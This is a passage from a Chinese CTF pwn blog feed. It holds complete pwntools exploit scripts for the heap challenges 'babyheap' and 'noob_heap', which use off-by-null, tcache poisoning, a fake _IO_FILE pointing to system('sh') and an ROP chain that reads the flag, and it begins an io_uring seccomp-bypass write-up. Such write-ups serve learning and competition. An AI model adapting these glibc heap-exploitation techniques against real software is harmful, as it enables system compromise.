class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>out()<br><br>buy2(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>2.38çš„off by nullï¼ˆä½ æƒ¦è®°ä½ é‚£é€¼unlinkå¹²å•¥å‘¢ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babyheap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2a0</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap)<br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x4f8</span>,p64(heap+<span class="hljs-number">0x7b0</span>)+p64(heap+<span class="hljs-number">0x7b0</span>)+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x4e0</span>+p64(<span class="hljs-number">0x500</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(heap+<span class="hljs-number">0x2b0</span>)+p64(heap+<span class="hljs-number">0x2b0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((heap&gt;&gt;<span class="hljs-number">12</span>)^(heap+<span class="hljs-number">0xae0</span>)))<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1feed0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^(heap&gt;&gt;<span class="hljs-number">12</span>))))<br><br>fake_io_addr = heap + <span class="hljs-number">0x2c0</span><br>fake_IO_struct = <span class="hljs-string">b&#x27;  sh;\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#rdi</span><br>fake_IO_struct += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x4</span><br>fake_IO_struct += p64(<span class="hljs-number">1</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap + <span class="hljs-number">0x800</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span>) <span class="hljs-comment">#fake_wide_addr</span><br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span> + <span class="hljs-number">0xe0</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])  <span class="hljs-comment">#system/setcontext</span><br><br>add(<span class="hljs-number">0x408</span>,fake_IO_struct+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,p64(heap+<span class="hljs-number">0x2c0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>gdb.attach(p)<br>sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="å¼ºç½‘æ‹Ÿæ€"><a href="#å¼ºç½‘æ‹Ÿæ€" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€"></a>å¼ºç½‘æ‹Ÿæ€</h1><p>ç”²çº§æˆ˜çŠ¯ç¬¬äºŒåœº</p><h2 id="noob-heap"><a href="#noob-heap" class="headerlink" title="noob_heap"></a>noob_heap</h2><p>ç©ä¸ªğŸ•8å †é£æ°´ï¼ŒğŸ§ è¦åæ‰äº†</p><p>off by null å’Œmalloc_consolidateçš„åˆ©ç”¨ç‚¹æ˜¯ä¸€çœ¼å°±çœ‹å‡ºæ¥äº†ï¼Œç„¶åğŸ‘´é£æ°´åšæ³•åšäº†å››ä¸ªå°æ—¶å®åœ¨æ‰›ä¸ä½äº†è€»è¾±ä¸‹ç­md</p><p>åæ¥çœ‹äº†æ˜Ÿç›Ÿçš„expåæç„¶å¤§æ‚Ÿã€‚malloc_consolidateç»ˆå½’è¿˜æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./noob_heap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x78</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x78</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">5</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#1-6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7-24</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i+<span class="hljs-number">7</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0-6</span><br><br>add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7</span><br>show(<span class="hljs-number">7</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0f0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x910</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>edit(<span class="hljs-number">10</span>, p64((heap_base + <span class="hljs-number">0x790</span>))*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">9</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">14</span>,p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>))<br><br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret_addr = stack - <span class="hljs-number">0x138</span> - <span class="hljs-number">0x60</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">14</span>,p64(ret_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>pop_rsi = <span class="hljs-number">0x0000000000160498</span> + libc.address<br>pop_rdx = <span class="hljs-number">0x00000000000796a2</span> + libc.address<br>lea_ret = <span class="hljs-number">0x000000000004da83</span> + libc.address<br>orw = flat([<br>    pop_rdi,ret_addr,<br>    pop_rsi,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">3</span>,<br>    pop_rsi,heap_base+<span class="hljs-number">0x300</span>,<br>    pop_rdx,<span class="hljs-number">0x40</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],<br>])<br>edit(<span class="hljs-number">0</span>,orw)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(lea_ret) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(heap_base+<span class="hljs-number">0x7a0</span>-<span class="hljs-number">8</span>) + p64(lea_ret))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFã€Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF</title>
    <link href="/2023/10/31/ACTF/"/>
    <url>/2023/10/31/ACTF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>ğŸ‘´æœ‰ç½ª</p><p>ğŸ‘´è¿™æ¬¡çˆ†é›¶äº†</p><p>å›æƒ³å‡ ä¸ªæœˆå‰remakeACTF2022ï¼Œå”¯ä¸€ä¸€é“remakeå‡ºæ¥çš„tree_pwnè¿˜æ˜¯çœ‹NamelessğŸ‘´çš„åšå®¢æ“çš„ã€‚</p><p>ä¸å¾—ä¸æ„Ÿå¹AAAçš„å¸ˆå‚…å‡ºé¢˜æ˜¯çœŸæœ‰æ°´å¹³ï¼Œæ²¡æœ‰å¥‡æ€ªçš„è„‘æ´ï¼Œå…¨æ˜¯å¹²è´§ã€‚</p><p>ä½†è¿™å’Œæˆ‘ä¸€é“éƒ½åšä¸å‡ºæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæ‚²</p><p>ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><p>æ²¡æœ‰èƒ½åŠ›çš„äººæ˜¯åªèƒ½èµ›åremakeçš„ï¼Œæ˜¯æ²¡æœ‰èµ„æ ¼äº«å—è§£é¢˜çš„æ¿€åŠ¨ä¸å–œæ‚¦çš„</p><p>å“ï¼Œå±‘koreyè¿™ç¯‡remakeä¼šå†™çš„å°½é‡è¯¦ç»†ã€‚</p><p>çœŸçš„è¦å¾—ç‰ç‰ç—‡äº†å‘œå‘œå‘œ</p><h1 id="0x1ï¼šPwn-remakeğŸ¤£"><a href="#0x1ï¼šPwn-remakeğŸ¤£" class="headerlink" title="0x1ï¼šPwn remakeğŸ¤£"></a>0x1ï¼šPwn remakeğŸ¤£</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>ä½ æ˜¯masterğŸï¼Œåæ­£ğŸ‘´ä¸æ˜¯</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>èƒ½ç›´æ¥æ‰§è¡Œè¾“å…¥çš„shellcodeï¼Œä½†æ˜¯ï¼Œæˆ‘è¦è¯´ä½†æ˜¯ï¼Œæœ¬é¢˜å¼€äº†ä¸€ä¸ªåŠå…¶ç¦»è°±çš„æ²™ç›’ï¼š</p><p><img src="/img/ACTF/0.png" alt="img"></p><p>æŠŠ<code>open read write</code>åŠå…¶æ›¿ä»£å“æ˜¯å…¨killäº†</p><p>ğŸ‘´å½“æ—¶æƒ³çš„æ˜¯<code>cloneã€forkã€ptraceã€lseek</code>è¿™äº›éƒ½æ²¡ç¦ï¼Œæƒ³ç”¨<code>ptrace</code>æ¥ç€ï¼Œåæ¥ä»”ç»†ä¸€æƒ³æˆ‘çœŸtmæ˜¯ä¸ªSBå•Šï¼Œæ— è®ºæ˜¯<code>fork</code>è¿˜æ˜¯<code>clone</code>ï¼Œåˆ›å»ºé‚£ä¸ªæ–°è¿›ç¨‹æ—¶sandboxå·²ç»è¢«è°ƒç”¨äº†ã€‚</p><p>ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼ŒğŸ‘´åˆæƒ³æ‰¾æ‰¾æœ‰æ²¡æœ‰<code>open read</code>çš„æ¼ç½‘ä¹‹é±¼ï¼Œæ‰“ä¸ªæµ‹ä¿¡é“ï¼Œç„¶åä¹Ÿæ²¡æœ‰äº†ä¸‹æ–‡ã€‚</p><p>ğŸ‘´å¼€æ‘†äº†ï¼Œåæ­£ğŸ‘´ä¸æ˜¯masterå°±ä¸æ˜¯å§ï¼ˆbushiï¼‰</p><p>æ¯”èµ›ç»“æŸåï¼ŒNightuğŸ‘´è¯´è¿™é¢˜ä¸€çœ¼çœ‹å‡º<code>io_uring</code></p><p>PSï¼šğŸ‘´å½“æ—¶çš„ååº”ï¼šè¿™åˆæ˜¯å“ªä¸ªğŸ”8ç©æ„ï¼Œæ€ä¹ˆäººä¸äººçš„å·®åˆ«æ¯”äººä¸ç‹—çš„éƒ½å¤§ï¼Œå¦ˆå¦ˆç”Ÿçš„</p><p>ç„¶åğŸ‘´å°±å»æ‰¾èµ„æ–™äº†è§£<code>io_uring</code>äº†</p><h3 id="What-â€˜s-io-uring"><a href="#What-â€˜s-io-uring" class="headerlink" title="What â€˜s io_uring"></a>What â€˜s io_uring</h3><p><code>io_uring</code>æ˜¯<code>linux</code>ä»å†…æ ¸ç‰ˆæœ¬5.1å¼€å§‹å¼•å…¥çš„é«˜æ€§èƒ½å¼‚æ­¥I&#x2F;Oæ¡†æ¶</p><p>å…·ä½“çš„å¯ä»¥çœ‹<a href="https://arthurchiao.art/blog/intro-to-io-uring-zh/#25-io_uring-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-api">è¿™ä¸ª</a></p><p>è¿™è¾¹ä¸»è¦è¯´ä¸€ä¸‹å’Œé¢˜ç›®ç›¸å…³çš„</p><p>å› ä¸ºğŸ‘´ä¸€ç›´ç”¨CSDNä¸Šçš„ç¥–ä¼ è°ƒç”¨è¡¨ï¼Œå¯¹äºè¿™ä¸‰ä¸ªè°ƒç”¨å·åœ¨400å¤šçš„ ğŸ‘´æ˜¯çœŸçš„æ²¡å°è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 